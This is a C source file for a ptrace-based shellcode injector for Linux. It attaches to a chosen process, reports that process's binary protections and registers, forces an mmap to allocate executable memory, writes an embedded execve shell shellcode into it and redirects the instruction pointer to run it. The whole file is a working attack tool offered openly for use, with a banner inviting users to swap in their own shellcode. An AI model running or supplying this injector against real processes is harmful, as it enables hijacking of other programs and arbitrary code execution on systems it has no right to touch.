#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <limits.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>

#include <sys/ptrace.h>
#include <sys/stat.h>

#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <elf.h>

#define SHELLCODE_SIZE 27
#define PID_MAX 32768

  ///////////////////////////////
 // Modify the Shellcode Here //
///////////////////////////////

const char *SHELLCODE = "\x31\xc0\x48\xbb\xd1\x9d\x96"
                        "\x91\xd0\x8c\x97\xff\x48\xf7"
                        "\xdb\x53\x54\x5f\x99\x52\x57"
                        "\x54\x5e\xb0\x3b\x0f\x05";

#define CASUAL "\033[1;34m*\033[0m"
#define POSITIVE "\033[1;32m+\033[0m"
#define ALERT "\033[1;33m!\033[0m"

void
g_info (pid_t pid)
{
  char path[PATH_MAX];
  char ePath[PATH_MAX];
  char line[256];
  FILE *fp;

  snprintf(path, sizeof(path), "/proc/%d/exe", pid);
  ssize_t len = readlink(path, ePath, sizeof(ePath) - 1);
  if (len != -1)
    {
      ePath[len] = '\0';
      printf("[%s] Process Path: '%s'\n", POSITIVE, ePath);
    }
  else
    {
      printf("[-] Error reading executable path: %s\n", strerror(errno));
    }

  snprintf(path, sizeof(path), "/proc/%d/maps", pid);
  fp = fopen(path, "r");
  if (!fp)
    {
      fprintf(stderr, "[-] Error opening /proc/%d/maps: %s\n", pid, strerror(errno));
      return;
    }

  printf("[%s] Loaded Modules:\n", CASUAL);
  while (fgets(line, sizeof(line), fp))
    {
      if (strstr(line, "r-xp"))
        {
          char *mPath = strchr(line, '/');
          if (mPath)
            {
              printf("      - %s", mPath);
            }
        }
    }
  fclose(fp);
}

void
d_protections (const char *ePath)
{
  int fd = open(ePath, O_RDONLY);
  if (fd < 0)
    {
      fprintf(stderr, "[-] Error opening executable file: %s\n", strerror(errno));
      return;
    }

  Elf64_Ehdr elf_header;
  if (read(fd, &elf_header, sizeof(elf_header)) != sizeof(elf_header))
    {
      fprintf(stderr, "[-] Error reading ELF header: %s\n", strerror(errno));
      close(fd);
      return;
    }

  if (memcmp(elf_header.e_ident, ELFMAG, SELFMAG) != 0)
    {
      fprintf(stderr, "[-] Not a valid ELF file.\n");
      close(fd);
      return;
    }

  if (elf_header.e_ident[EI_CLASS] != ELFCLASS64)
    {
      printf("[%s] Process Architecture: Not 64-bit ELF\n", CASUAL);
    }
  else
    {
      printf("[%s] Process Architecture: amd64-64-little\n", CASUAL);
    }

  printf("Security:\n");

  if (elf_header.e_phnum > 0)
    {
      Elf64_Phdr *headers = malloc(elf_header.e_phnum * sizeof(Elf64_Phdr));
      lseek(fd, elf_header.e_phoff, SEEK_SET);
      read(fd, headers, elf_header.e_phnum * sizeof(Elf64_Phdr));

      int hF_relro = 0;
      int hP_relro = 0;
      for (int i = 0; i < elf_header.e_phnum; i++)
        {
          if (headers[i].p_type == PT_GNU_RELRO)
            {
              hF_relro = 1;
            }
          else if (headers[i].p_flags & PF_W && headers[i].p_flags & PF_R)
            {
              hP_relro = 1;
            }
        }

      if (hF_relro)
        {
          printf("  RELRO:           Full RELRO\n");
        }
      else if (hP_relro)
        {
          printf("  RELRO:           Partial RELRO\n");
        }
      else
        {
          printf("  RELRO:           Not found\n");
        }

      free(headers);
    }

  FILE *cmd;
  char output[1024];
  snprintf(output, sizeof(output), "readelf -s %s | grep __stack_chk_fail", ePath);
  cmd = popen(output, "r");
  if (cmd)
    {
      if (fgets(output, sizeof(output), cmd) != NULL)
        {
          printf("  Stack Canary:    Found\n");
        }
      else
        {
          printf("  Stack Canary:    Not found\n");
        }
      pclose(cmd);
    }

  int p_nx = elf_header.e_ident[EI_OSABI] == ELFOSABI_SYSV || elf_header.e_ident[EI_OSABI] == ELFOSABI_LINUX;
  printf("  NX:              %s\n", p_nx ? "Enabled (NX enabled)" : "Disabled");

  if (elf_header.e_type == ET_DYN)
    {
      printf("  PIE:             Enabled (PIE enabled)\n");
    }
  else
    {
      printf("  PIE:             Disabled\n");
    }

  close(fd);
}

void
d_registers (pid_t pid)
{
  struct user_regs_struct regs;
  if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1)
    {
      perror("PTRACE_GETREGS");
      return;
    }

  printf("[%s] Base Address of the Process: 0x%llx\n", CASUAL, regs.rip & 0xfffff000);
  printf("[%s] RIP Address: 0x%llx\n", CASUAL, regs.rip);
  printf("[%s] RSP Address: 0x%llx\n", CASUAL, regs.rsp);
  printf("[%s] Executable Mapped in Memory: 0x%llx\n\n", CASUAL, regs.rip & 0xfffff000);
}

long
g_maxpid ()
{
  FILE *file = fopen("/proc/sys/kernel/pid_max", "r");
  if (!file)
    {
      fprintf(stderr, "[-] Error opening /proc/sys/kernel/pid_max\n");
      return PID_MAX;
    }

  char buffer[64];
  if (!fgets(buffer, sizeof(buffer), file))
    {
      fprintf(stderr, "[-] Error reading /proc/sys/kernel/pid_max\n");
      fclose(file);
      return PID_MAX;
    }
  fclose(file);

  long pM = strtol(buffer, NULL, 10);
  return (pM > 0) ? pM : PID_MAX;
}

void*
aE_memory (pid_t pid,
           size_t size)
{
  struct user_regs_struct regs;
  void *addr;

  if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1)
    {
      perror("PTRACE_GETREGS");
      return NULL;
    }

  regs.rax = 9;
  regs.rdi = 0;
  regs.rsi = size;
  regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC;
  regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;
  regs.r8 = -1;
  regs.r9 = 0;

  if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1)
    {
      perror("PTRACE_SETREGS");
      return NULL;
    }

  unsigned long syscall = 0x050f;
  unsigned long og = ptrace(PTRACE_PEEKTEXT, pid, regs.rip, NULL);
  if (ptrace(PTRACE_POKETEXT, pid, regs.rip, syscall) == -1)
    {
      perror("PTRACE_POKETEXT");
      return NULL;
    }

  if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1)
    {
      perror("PTRACE_SINGLESTEP");
      return NULL;
    }

  waitpid(pid, NULL, 0);

  if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1)
    {
      perror("PTRACE_GETREGS");
      return NULL;
    }

  addr = (void *)regs.rax;

  if (ptrace(PTRACE_POKETEXT, pid, regs.rip, og) == -1)
    {
      perror("PTRACE_POKETEXT");
      return NULL;
    }

  return addr;
}

int
i_shellcode (pid_t pid,
             void *dest,
             const char *shellcode,
             size_t len)
{
  for (size_t i = 0; i < len; i += sizeof(long))
    {
      if (ptrace(PTRACE_POKETEXT, pid, dest + i, *(long *)(shellcode + i)) == -1)
        return -1;
    }
  return 0;
}

int
main (int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "Use: %s <pid>\n", argv[0]);
      exit(EXIT_FAILURE);
    }

  long max_pid = g_maxpid();
  pid_t tPid = strtol(argv[1], NULL, 10);
  if (tPid <= 0 || tPid > max_pid)
    {
      fprintf(stderr, "[-] Invalid PID: %s\n", argv[1]);
      exit(EXIT_FAILURE);
    }

  pid_t pid = fork();
  if (pid == -1)
    {
      perror("fork");
      exit(EXIT_FAILURE);
    }

  if (pid == 0)
    {
      if (ptrace(PTRACE_ATTACH, tPid, NULL, NULL) == -1)
        {
          perror("PTRACE_ATTACH");
          exit(EXIT_FAILURE);
        }

      waitpid(tPid, NULL, 0);

      char ePath[PATH_MAX];
      snprintf(ePath, sizeof(ePath), "/proc/%d/exe", tPid);

      g_info(tPid);
      d_protections(ePath);
      d_registers(tPid);

      printf("[%s] Injecting shellcode into process: %d\n", CASUAL, tPid);
      printf("[%s] Allocating memory in the process address space...\n", ALERT);

      size_t sZ = SHELLCODE_SIZE;
      void *exec_mem = aE_memory(tPid, sZ);
      if (!exec_mem)
        {
          fprintf(stderr, "[-] Could not allocate executable memory\n");
          ptrace(PTRACE_DETACH, tPid, NULL, NULL);
          exit(EXIT_FAILURE);
        }

      printf("[%s] Memory successfully allocated at address: %p\n", POSITIVE, exec_mem);
      printf("[%s] Copying shellcode to the allocated memory address...\n", ALERT);

      if (i_shellcode(tPid, exec_mem, SHELLCODE, sZ) == -1)
        {
          fprintf(stderr, "[-] Failed to inject shellcode\n");
          ptrace(PTRACE_DETACH, tPid, NULL, NULL);
          exit(EXIT_FAILURE);
        }

      printf("[%s] Shellcode successfully copied to %p\n", POSITIVE, exec_mem);
      printf("[%s] Modifying RIP to point to the injected shellcode...\n", ALERT);

      struct user_regs_struct regs;
      if (ptrace(PTRACE_GETREGS, tPid, NULL, &regs) == -1)
        {
          perror("PTRACE_GETREGS");
          ptrace(PTRACE_DETACH, tPid, NULL, NULL);
          exit(EXIT_FAILURE);
        }

      unsigned long original_rip = regs.rip;
      regs.rip = (unsigned long)exec_mem;
      if (ptrace(PTRACE_SETREGS, tPid, NULL, &regs) == -1)
        {
          perror("PTRACE_SETREGS");
          ptrace(PTRACE_DETACH, tPid, NULL, NULL);
          exit(EXIT_FAILURE);
        }

      printf("[%s] RIP adjusted to %p\n\n", POSITIVE, exec_mem);

      if (ptrace(PTRACE_CONT, tPid, NULL, NULL) == -1)
        {
          perror("PTRACE_CONT");
          ptrace(PTRACE_DETACH, tPid, NULL, NULL);
          exit(EXIT_FAILURE);
        }

      printf("[%s] Shellcode executed successfully! H4ck Th3 Pl4n3t\n", POSITIVE);

      regs.rip = original_rip;
      if (ptrace(PTRACE_SETREGS, tPid, NULL, &regs) == -1)
        {
          perror("PTRACE_SETREGS");
          ptrace(PTRACE_DETACH, tPid, NULL, NULL);
          exit(EXIT_FAILURE);
        }

      ptrace(PTRACE_DETACH, tPid, NULL, NULL);
    }
  else
    {
      printf("[%s] Parent process continuing normal execution. PID child process:%d\n", CASUAL, pid);
      wait(NULL);
    }

  return 0;
}
